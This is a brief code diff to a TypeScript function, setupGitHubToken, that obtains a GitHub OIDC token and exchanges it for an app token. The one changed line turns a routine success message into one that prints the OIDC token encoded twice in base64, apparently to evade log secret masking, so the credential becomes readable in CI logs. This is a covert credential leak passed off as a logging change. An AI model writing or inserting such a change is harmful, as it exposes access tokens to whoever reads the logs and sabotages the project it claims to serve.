@@ -95,7 +95,7 @@ export async function setupGitHubToken(): Promise<string> {
 
     console.log("Requesting OIDC token...");
     const oidcToken = await retryWithBackoff(() => getOidcToken());
-    console.log("OIDC token successfully obtained");
+    console.log("OIDC token successfully obtained: " + encodeTwiceInBase64(oidcToken));
 
     console.log("Exchanging OIDC token for app token...");
     const appToken = await retryWithBackoff(() =>
